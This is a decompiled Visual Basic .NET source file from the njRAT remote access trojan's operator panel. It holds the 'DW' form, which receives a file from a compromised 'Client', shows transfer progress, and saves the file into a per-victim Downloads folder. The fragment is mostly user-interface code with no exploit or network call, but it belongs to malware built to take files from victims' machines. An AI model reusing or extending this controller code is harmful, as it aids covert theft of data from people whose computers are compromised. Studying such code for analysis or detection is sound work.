Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.NJRAT.NJRAT

Namespace NJRAT
    ' Token: 0x0200000E RID: 14
    <DesignerGenerated()>
    Partial Public Class DW
        Inherits Form

        ' Token: 0x06000165 RID: 357 RVA: 0x0000C8F4 File Offset: 0x0000AAF4
        <DebuggerNonUserCode()>
        Private Shared Sub __ENCAddToList(value As Object)
            Dim _ENCList As List(Of WeakReference) = DW.__ENCList
            SyncLock _ENCList
                If DW.__ENCList.Count = DW.__ENCList.Capacity Then
                    Dim num As Integer = 0
                    Dim num2 As Integer = 0
                    Dim num3 As Integer = DW.__ENCList.Count - 1
                    Dim num4 As Integer = num2
                    While True
                        Dim num5 As Integer = num4
                        Dim num6 As Integer = num3
                        If num5 > num6 Then
                            Exit While
                        End If
                        Dim weakReference As WeakReference = DW.__ENCList(num4)
                        If weakReference.IsAlive Then
                            If num4 <> num Then
                                DW.__ENCList(num) = DW.__ENCList(num4)
                            End If
                            num += 1
                        End If
                        num4 += 1
                    End While
                    DW.__ENCList.RemoveRange(num, DW.__ENCList.Count - num)
                    DW.__ENCList.Capacity = DW.__ENCList.Count
                End If
                DW.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        ' Token: 0x17000087 RID: 135
        ' (get) Token: 0x06000168 RID: 360 RVA: 0x0000CDBC File Offset: 0x0000AFBC
        ' (set) Token: 0x06000169 RID: 361 RVA: 0x00002A7D File Offset: 0x00000C7D
        Friend Overridable Property ProgressBar1 As ProgressBar
            <DebuggerNonUserCode()>
            Get
                Return Me._ProgressBar1
            End Get
            <DebuggerNonUserCode()>
            <MethodImpl(MethodImplOptions.Synchronized)>
            Set(value As ProgressBar)
                Me._ProgressBar1 = value
            End Set
        End Property

        ' Token: 0x17000088 RID: 136
        ' (get) Token: 0x0600016A RID: 362 RVA: 0x0000CDD4 File Offset: 0x0000AFD4
        ' (set) Token: 0x0600016B RID: 363 RVA: 0x00002A86 File Offset: 0x00000C86
        Friend Overridable Property Lv1 As GClass9
            <DebuggerNonUserCode()>
            Get
                Return Me._Lv1
            End Get
            <DebuggerNonUserCode()>
            <MethodImpl(MethodImplOptions.Synchronized)>
            Set(value As GClass9)
                Me._Lv1 = value
            End Set
        End Property

        ' Token: 0x17000089 RID: 137
        ' (get) Token: 0x0600016C RID: 364 RVA: 0x0000CDEC File Offset: 0x0000AFEC
        ' (set) Token: 0x0600016D RID: 365 RVA: 0x0000CE04 File Offset: 0x0000B004
        Friend Overridable Property Button1 As Button
            <DebuggerNonUserCode()>
            Get
                Return Me._Button1
            End Get
            <DebuggerNonUserCode()>
            <MethodImpl(MethodImplOptions.Synchronized)>
            Set(value As Button)
                Dim value2 As EventHandler = AddressOf Me.Button1_Click
                If Me._Button1 IsNot Nothing Then
                    RemoveHandler Me._Button1.Click, value2
                End If
                Me._Button1 = value
                If Me._Button1 IsNot Nothing Then
                    AddHandler Me._Button1.Click, value2
                End If
            End Set
        End Property

        ' Token: 0x1700008A RID: 138
        ' (get) Token: 0x0600016E RID: 366 RVA: 0x0000CE5C File Offset: 0x0000B05C
        ' (set) Token: 0x0600016F RID: 367 RVA: 0x0000CE74 File Offset: 0x0000B074
        Friend Overridable Property Timer1 As Timer
            <DebuggerNonUserCode()>
            Get
                Return Me._Timer1
            End Get
            <DebuggerNonUserCode()>
            <MethodImpl(MethodImplOptions.Synchronized)>
            Set(value As Timer)
                Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
                If Me._Timer1 IsNot Nothing Then
                    RemoveHandler Me._Timer1.Tick, value2
                End If
                Me._Timer1 = value
                If Me._Timer1 IsNot Nothing Then
                    AddHandler Me._Timer1.Tick, value2
                End If
            End Set
        End Property

        ' Token: 0x1700008B RID: 139
        ' (get) Token: 0x06000170 RID: 368 RVA: 0x0000CECC File Offset: 0x0000B0CC
        ' (set) Token: 0x06000171 RID: 369 RVA: 0x00002A8F File Offset: 0x00000C8F
        Friend Overridable Property ColumnHeader1 As ColumnHeader
            <DebuggerNonUserCode()>
            Get
                Return Me._ColumnHeader1
            End Get
            <DebuggerNonUserCode()>
            <MethodImpl(MethodImplOptions.Synchronized)>
            Set(value As ColumnHeader)
                Me._ColumnHeader1 = value
            End Set
        End Property

        ' Token: 0x1700008C RID: 140
        ' (get) Token: 0x06000172 RID: 370 RVA: 0x0000CEE4 File Offset: 0x0000B0E4
        ' (set) Token: 0x06000173 RID: 371 RVA: 0x00002A98 File Offset: 0x00000C98
        Friend Overridable Property ColumnHeader2 As ColumnHeader
            <DebuggerNonUserCode()>
            Get
                Return Me._ColumnHeader2
            End Get
            <DebuggerNonUserCode()>
            <MethodImpl(MethodImplOptions.Synchronized)>
            Set(value As ColumnHeader)
                Me._ColumnHeader2 = value
            End Set
        End Property

        ' Token: 0x06000174 RID: 372 RVA: 0x0000CEFC File Offset: 0x0000B0FC
        Public Sub New()
            AddHandler MyBase.FormClosing, AddressOf Me.DW_FormClosing
            AddHandler MyBase.Load, AddressOf Me.DW_Load
            DW.__ENCAddToList(Me)
            Me.os = 0
            Me.InitializeComponent()
        End Sub

        ' Token: 0x06000175 RID: 373 RVA: 0x0000CF48 File Offset: 0x0000B148
        Private Sub DW_FormClosing(sender As Object, e As FormClosingEventArgs)
            Try
                Me.FS.Close()
            Catch ex As Exception
            End Try
            Try
                Me.FS.Dispose()
            Catch ex2 As Exception
            End Try
            Try
                File.Delete(Me.tmp)
            Catch ex3 As Exception
            End Try
            Me.Button1.Enabled = False
            Me.c.CN = False
        End Sub

        ' Token: 0x06000176 RID: 374 RVA: 0x0000CFEC File Offset: 0x0000B1EC
        Private Sub DW_Load(sender As Object, e As EventArgs)
            Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)), " - ")), Class6.smethod_16(Me.FN))))
            Me.ProgressBar1.Maximum = Me.SZ
            Me.folder = Me.osk.Folder + "Downloads\"
            If Not Directory.Exists(Me.folder) Then
                Directory.CreateDirectory(Me.folder)
            End If
            Me.folder += New FileInfo(Class6.smethod_16(Me.FN)).Name
            Me.Lv1.Items(0).SubItems(0).Text = New FileInfo(Class6.smethod_16(Me.FN)).Name
            Me.Lv1.Items(1).SubItems(0).Text = Class6.smethod_17(CLng(Me.SZ))
            Do
                Me.tmp = Interaction.Environ("temp") + "\njfm_" + Class6.smethod_6(10)
            Loop While File.Exists(Me.tmp)
            Me.FS = New FileStream(Me.tmp, FileMode.Append)
            Me.Lv1.Items(2).SubItems(0).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
            Me.os = Me.ProgressBar1.Value
            Me.Lv1.Items(3).SubItems(0).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
            Me.Lv1.method_3()
            Me.Timer1.Enabled = True
        End Sub

        ' Token: 0x06000177 RID: 375 RVA: 0x0000D1E4 File Offset: 0x0000B3E4
        Private Sub Timer1_Tick(sender As Object, e As EventArgs)
            Try
                Me.Lv1.Items(2).SubItems(1).Text = Class6.smethod_17(CLng((Me.ProgressBar1.Value - Me.os)))
                Me.os = Me.ProgressBar1.Value
                Me.Lv1.Items(3).SubItems(1).Text = Class6.smethod_17(CLng(Me.ProgressBar1.Value))
            Catch ex As Exception
            End Try
        End Sub

        ' Token: 0x06000178 RID: 376 RVA: 0x0000D290 File Offset: 0x0000B490
        Private Sub Button1_Click(sender As Object, e As EventArgs)
            If Operators.CompareString(Me.Button1.Text, "Stop", False) = 0 Then
                Me.FS.Close()
                Me.FS.Dispose()
                File.Delete(Me.tmp)
                Me.Button1.Enabled = False
                Me.c.CN = False
                Me.Close()
            Else
                Me.FS.Close()
                Me.FS.Dispose()
                File.Move(Me.tmp, Me.folder)
            End If
        End Sub

        ' Token: 0x040000A2 RID: 162
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

        ' Token: 0x040000A4 RID: 164
        <AccessedThroughProperty("ProgressBar1")>
        Private _ProgressBar1 As ProgressBar

        ' Token: 0x040000A5 RID: 165
        <AccessedThroughProperty("Lv1")>
        Private _Lv1 As GClass9

        ' Token: 0x040000A6 RID: 166
        <AccessedThroughProperty("Button1")>
        Private _Button1 As Button

        ' Token: 0x040000A7 RID: 167
        <AccessedThroughProperty("Timer1")>
        Private _Timer1 As Timer

        ' Token: 0x040000A8 RID: 168
        <AccessedThroughProperty("ColumnHeader1")>
        Private _ColumnHeader1 As ColumnHeader

        ' Token: 0x040000A9 RID: 169
        <AccessedThroughProperty("ColumnHeader2")>
        Private _ColumnHeader2 As ColumnHeader

        ' Token: 0x040000AA RID: 170
        Public c As Client

        ' Token: 0x040000AB RID: 171
        Public FN As String

        ' Token: 0x040000AC RID: 172
        Public folder As String

        ' Token: 0x040000AD RID: 173
        Public FS As FileStream

        ' Token: 0x040000AE RID: 174
        Public os As Integer

        ' Token: 0x040000AF RID: 175
        Public osk As Client

        ' Token: 0x040000B0 RID: 176
        Public SZ As Integer

        ' Token: 0x040000B1 RID: 177
        Public tmp As String
    End Class
End Namespace
